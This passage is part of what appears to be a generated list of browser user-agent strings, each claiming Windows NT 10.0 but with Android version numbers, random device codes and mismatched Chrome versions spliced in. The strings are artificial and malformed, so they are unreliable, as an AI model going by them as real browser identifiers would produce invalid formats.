(KHTML, like Gecko)93.0.4593.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q707B) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4711.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A834B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4281.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G77D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4881.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S553Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4456.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I847E) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4876.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L24A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4737.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)X828H) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4367.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K849U) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4633.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I918D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4315.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A955Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4514.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R532C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4352.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C329V) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4754.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q555V) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4637.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C736V) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4479.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q447S) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4870.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H556Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4282.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R177O) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4844.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z414R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4380.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B885G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4529.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D567X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4761.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S675T) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4290.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D479D) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4723.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H448O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4602.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E376C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4228.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R275J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4553.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A100G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4697.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V24H) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4603.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U81V) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4323.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O497F) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4818.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W66A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4334.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H730R) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4208.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z286Q) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4577.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N141M) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4328.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X446Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4647.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z919K) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4595.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P858B) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4888.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F169A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4229.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L107Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4807.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H401L) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4461.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L661F) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4515.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T965P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4357.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z781N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4857.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I198T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4748.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O580C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4819.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N976C) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4321.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V920D) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4888.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I929P) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4698.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J335P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4554.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q364V) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4735.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D450W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4830.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K920Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4312.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M64K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4733.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L966T) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4678.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q558U) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4771.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I581S) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4394.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B853R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4826.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L708V) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4851.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z653T) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4304.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M775B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4537.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P533M) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4304.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M365W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4313.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N965N) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4706.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F487L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4401.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D854Q) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4554.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G717C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4504.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z654E) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4809.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T610A) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4533.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S426Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4460.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F959N) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4700.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N657V) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4220.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G71V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4444.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M110G) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4337.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S425S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4328.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U460F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4749.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K292V) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4664.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J45O) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4833.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D379E) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4249.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S51G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4700.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S143C) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4786.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T757L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4758.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I530R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4607.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O227A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4887.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F893G) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4826.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S625K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4260.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H658Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4686.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V323T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4303.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W996H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4626.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z571S) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4797.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A988R) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4288.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q638Y) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4290.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A46Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4840.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U518H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4502.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K379Z) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4415.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F510G) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4454.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A499K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4746.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J746U) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4269.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J858Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4670.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W268U) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4540.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A675E) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4475.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A190N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4427.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A24Y) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4608.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L898M) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4807.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y211Q) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4781.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X249Y) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4679.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X459F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4659.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F758L) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4584.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y719M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4485.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B336C) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4863.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R305I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4285.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y603F) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4523.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L924N) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4344.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S161X) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4860.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T137J) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4821.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P36P) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4420.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D532N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4425.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F289B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4654.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V803X) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4796.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A936M) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4642.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F438C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4712.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J86E) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4832.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I437N) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4373.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V530M) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4771.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A768R) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4443.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J813A) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4594.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V856J) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4492.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M58P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4805.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C629S) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4333.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z935C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4769.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B354N) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4559.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)G516W) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4357.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V338L) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4236.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y958O) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4830.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A709W) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4518.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N798I) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4460.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B259T) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4865.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R151D) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4682.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T670F) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4816.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q389D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4686.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L896J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4610.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y484A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4371.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M748W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4892.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M882P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4205.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B892I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4673.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K951M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4340.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E564F) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4243.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T749Y) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4302.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X26W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4318.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W491A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4864.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O474X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4638.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q268R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4353.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C975P) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4537.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B792C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4657.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N392S) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4778.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I701U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4791.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E786K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4742.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580Z) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4796.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z338U) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4787.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D790G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4543.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A817V) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4493.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z96J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4326.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F134D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4489.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E520F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4692.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 